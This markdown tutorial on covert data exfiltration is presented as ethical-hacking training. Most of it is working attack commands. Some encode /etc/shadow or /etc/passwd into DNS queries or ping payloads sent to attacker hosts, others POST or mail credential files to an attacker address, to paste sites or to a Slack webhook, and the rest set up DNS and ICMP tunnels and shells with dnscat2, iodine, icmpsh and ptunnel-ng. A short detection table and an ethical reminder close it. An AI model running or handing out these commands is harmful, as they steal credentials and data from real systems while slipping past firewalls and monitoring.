# 🕳 Data Exfiltration Techniques — Advanced Covert Channels

## 📖 What Is Data Exfiltration?

**Data exfiltration** is the unauthorized transfer of data **from the target back to the attacker**. In ethical hacking, it simulates what a real attacker would do to steal sensitive information.

> **Exfiltration** focuses on getting data OUT, often through **covert channels** that bypass firewalls and security monitoring.

```text
  TARGET (Has Data)                          ATTACKER (Wants Data)
  ┌──────────────────┐                      ┌──────────────┐
  │  📄 Passwords    │                      │              │
  │  📊 Database     │   Covert Channel     │  Receives    │
  │  🔑 SSH Keys     │ ───────────────────▶ │  stolen data │
  │  📁 Documents    │   DNS/ICMP/HTTPS     │              │
  │  🏦 Financial    │   looks "normal"     │              │
  └──────────────────┘                      └──────────────┘
                          │
                     🔥 FIREWALL
                     Sees "normal" traffic
                     Doesn't block it!
```

---

## 🎯 Why Use Covert Exfiltration?

| Situation | Problem | Covert Solution |
| --- | --- | --- |
| All outbound ports blocked | Can't use HTTP/FTP/SMB | DNS exfil (port 53 almost always open) |
| Deep packet inspection | IDS detects file transfers | ICMP tunneling |
| HTTPS only allowed | Only web traffic permitted | HTTPS-based exfil |
| Data Loss Prevention (DLP) | DLP scans HTTP uploads | DNS/ICMP bypass DLP |
| Heavy monitoring | SOC watches all connections | Slow/low exfil over time |

---

# 1️⃣ DNS Exfiltration — Most Powerful Covert Channel

## 🧠 How It Works

DNS (port 53) is **almost never blocked** by firewalls — every machine needs DNS to work.

**The trick:** Encode your data **inside DNS queries**.

```text
  Normal DNS query:
    "What is the IP of google.com?"  → 142.250.180.14

  Exfiltration DNS query:
    "What is the IP of cGFzc3dvcmQxMjM=.attacker.com?"
                      ^^^^^^^^^^^^^^^^
                      This is Base64 encoded stolen data!
```

### How DNS Exfiltration Works Step by Step

```text
  TARGET                   DNS SERVER              ATTACKER'S DNS
  ┌──────────┐            ┌──────────┐            ┌──────────────┐
  │          │  DNS Query  │          │  Forward   │              │
  │ Encodes  │ ──────────▶│ Company  │ ─────────▶│  Receives    │
  │ data as  │  "dG9wc2Vj │ DNS      │  query to  │  queries     │
  │ subdomain│  cmV0.evil │          │  evil.com  │  Decodes     │
  │          │  .com"     │          │  NS server │  data        │
  └──────────┘            └──────────┘            └──────────────┘
```

---

### Tools for DNS Exfiltration

#### dnscat2

```bash
# ATTACKER — Start DNS server
dnscat2-server attacker-domain.com

# TARGET — Connect and send data
dnscat2 attacker-domain.com

# In dnscat2 shell:
download /etc/shadow
```

#### iodine (DNS Tunnel)

```bash
# ATTACKER — Start DNS tunnel server
iodined -f 10.0.0.1 tunnel.attacker-domain.com

# TARGET — Connect
iodine -f tunnel.attacker-domain.com

# Now you have a full network tunnel through DNS!
# Transfer files normally through the tunnel
scp file user@10.0.0.1:/tmp/
```

#### Manual DNS Exfiltration (No Tools!)

```bash
# TARGET — Encode data and send as DNS queries
cat /etc/passwd | base64 -w 30 | while read line; do
    nslookup "$line.attacker-domain.com"
    sleep 1
done
```

```bash
# ATTACKER — Capture DNS queries in logs
sudo tcpdump -i eth0 port 53 -w dns_captures.pcap

# Extract data from captured queries
tshark -r dns_captures.pcap -T fields -e dns.qry.name | \
    grep "attacker-domain.com" | \
    sed 's/.attacker-domain.com//' | \
    base64 -d > exfiltrated_data.txt
```

---

# 2️⃣ ICMP Exfiltration — Hiding Data in Pings

## 🧠 How It Works

ICMP (ping) packets have a **data field** that normally contains random padding. Attackers put **stolen data in this field**.

```text
  Normal ping:
    ICMP Echo Request → data: "abcdefghij" (random padding)

  Exfiltration ping:
    ICMP Echo Request → data: "root:x:0:0:..." (stolen /etc/passwd!)
```

Firewalls usually **allow ICMP** because admins need ping to troubleshoot.

---

### Tools for ICMP Exfiltration

#### icmpsh (ICMP Shell)

```bash
# ATTACKER — Listen for ICMP
sudo python3 icmpsh_m.py ATTACKER_IP TARGET_IP

# TARGET — Connect back
icmpsh.exe -t ATTACKER_IP
```

#### Manual ICMP (ping) Exfiltration

**Target (Linux):**

```bash
# Send data one line at a time via ping
cat /etc/shadow | xxd -p -c 16 | while read line; do
    ping -c 1 -p "$line" ATTACKER_IP
    sleep 0.5
done
```

**Attacker — Capture:**

```bash
sudo tcpdump -i eth0 icmp -w icmp_exfil.pcap
# Then extract data from packet payloads
```

#### ptunnel-ng (ICMP Tunnel)

```bash
# ATTACKER — Start ICMP tunnel server
ptunnel-ng -s

# TARGET — Connect through ICMP tunnel
ptunnel-ng -p ATTACKER_IP -l 8000 -r ATTACKER_IP -R 22

# Now SSH through the tunnel
ssh -p 8000 user@127.0.0.1
# Transfer files normally!
```

---

# 3️⃣ HTTPS Exfiltration — Blending with Web Traffic

## 🧠 How It Works

HTTPS traffic is **encrypted**, so DLP and IDS can't inspect the content. Data hidden inside HTTPS looks like normal web browsing.

---

### POST to External Server

**Attacker — Set up HTTPS listener:**

```bash
# Generate self-signed cert
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Start HTTPS server
python3 -c "
import http.server, ssl
server = http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler)
server.socket = ssl.wrap_socket(server.socket, certfile='cert.pem', keyfile='key.pem', server_side=True)
server.serve_forever()
"
```

**Target — Send data:**

```powershell
# PowerShell — POST data to HTTPS
$data = Get-Content C:\secrets.txt -Raw
Invoke-WebRequest -Uri "https://ATTACKER_IP/exfil" -Method POST -Body $data -SkipCertificateCheck
```

```bash
# Linux — curl POST
curl -k -X POST https://ATTACKER_IP/exfil -d @/etc/shadow
```

---

### Using Cloud Services (Hard to Block)

```bash
# Upload to Pastebin-like service
curl -X POST -d "$(cat /etc/shadow)" https://paste.ee/api

# Upload to Slack webhook (if available)
curl -X POST -H 'Content-type: application/json' \
  --data "{\"text\":\"$(base64 -w 0 /etc/shadow)\"}" \
  https://hooks.slack.com/services/YOUR/WEBHOOK/URL
```

> These are hard to block because companies use the same services legitimately.

---

# 4️⃣ Email Exfiltration

### Send Data via Email

**Linux:**

```bash
# Send file as email
cat /etc/shadow | mail -s "Report" attacker@email.com

# Using sendmail
sendmail attacker@email.com < /etc/shadow

# Using SMTP with curl
curl smtp://mail.company.com --mail-from victim@company.com \
     --mail-rcpt attacker@email.com \
     -T /etc/shadow
```

**PowerShell:**

```powershell
Send-MailMessage -To "attacker@email.com" -From "user@company.com" `
    -Subject "Report" -Body (Get-Content C:\secrets.txt -Raw) `
    -SmtpServer "smtp.company.com"
```

---

# 5️⃣ Scheduled/Slow Exfiltration

### Drip Exfiltration (Stay Under the Radar)

Instead of sending all data at once (suspicious), send small amounts over time.

```bash
# Send 1 line every 5 minutes
cat /etc/shadow | while read line; do
    nslookup "$(echo $line | base64 -w 0).attacker.com"
    sleep 300  # 5 minutes between each query
done
```

```text
  FAST EXFIL:  ████████████ → 🚨 DETECTED! (sudden data spike)
  
  SLOW EXFIL:  █..█..█..█.. → ✅ Blends with normal traffic
               (small chunks over hours/days)
```

---

# 6️⃣ Physical Exfiltration

| Method | Description |
| --- | --- |
| USB drive | Copy data to USB |
| Phone camera | Photo of screen |
| Print | Print sensitive docs |
| Cloud sync | OneDrive/Dropbox auto-sync |

---

## 🔥 Realistic Scenarios

---

### Scenario 1: All Ports Blocked Except DNS

```text
SITUATION: Target only allows DNS (port 53) outbound
All other ports blocked by firewall

ATTACKER:
┌────────────────────────────────────────────────┐
│ # Start DNS tunnel server                      │
│ iodined -f 10.0.0.1 tunnel.attacker.com        │
└────────────────────────────────────────────────┘

TARGET:
┌────────────────────────────────────────────────┐
│ # Connect through DNS tunnel                   │
│ iodine -f tunnel.attacker.com                  │
│                                                │
│ # Now transfer files through tunnel            │
│ scp /etc/shadow user@10.0.0.1:/tmp/           │
└────────────────────────────────────────────────┘
```

---

### Scenario 2: DLP Blocking All File Uploads

```text
SITUATION: Company DLP blocks all file uploads via HTTP
But DNS queries pass through

TARGET:
┌────────────────────────────────────────────────┐
│ # Exfiltrate via DNS queries                   │
│ cat passwords.txt | base64 -w 30 |             │
│   while read line; do                          │
│     dig "$line.exfil.attacker.com"             │
│     sleep 2                                    │
│   done                                         │
└────────────────────────────────────────────────┘

ATTACKER:
┌────────────────────────────────────────────────┐
│ # Capture DNS and decode                       │
│ sudo tcpdump -i eth0 port 53 |                 │
│   grep "exfil.attacker.com" |                  │
│   decode_script.py > passwords.txt             │
└────────────────────────────────────────────────┘
```

---

## 📊 Exfiltration Methods Comparison

| Method | Port | Detection Difficulty | Speed | Setup Complexity |
| --- | --- | --- | --- | --- |
| DNS | 53 | ⭐⭐⭐⭐ Very Hard | Slow | ⭐⭐⭐ |
| ICMP | N/A | ⭐⭐⭐⭐ Very Hard | Slow | ⭐⭐⭐ |
| HTTPS | 443 | ⭐⭐⭐ Hard | Fast | ⭐⭐ |
| Email | 25/587 | ⭐⭐ Medium | Fast | ⭐ |
| Cloud | 443 | ⭐⭐⭐ Hard | Fast | ⭐ |
| Slow/Drip | Any | ⭐⭐⭐⭐⭐ Hardest | Very slow | ⭐⭐ |

---

## 🛡 Blue Team — Detection

| Channel | Detection Method |
| --- | --- |
| DNS | Monitor for unusually long subdomain names, high DNS query volume |
| ICMP | Check ICMP packet sizes (normal ping = 64 bytes) |
| HTTPS | SSL inspection, anomalous POST sizes |
| Email | DLP on email attachments and body content |
| Cloud | Block unauthorized cloud services |
| Slow exfil | Baseline traffic and detect anomalies over time |

### Tools for Detection

| Tool | Detects |
| --- | --- |
| PassiveDNS | Anomalous DNS queries |
| Zeek (Bro) | Network protocol anomalies |
| Wireshark | Packet-level inspection |
| DLP Solutions | Data in motion monitoring |
| UEBA | User behavior anomalies |

---

## ⚠ Ethical Reminder

* ✅ Only use on systems with **written authorization**
* ✅ In real pentests, demonstrate exfil capability — don't steal actual data
* ✅ Practice in your own lab
* ❌ Never exfiltrate real data without permission
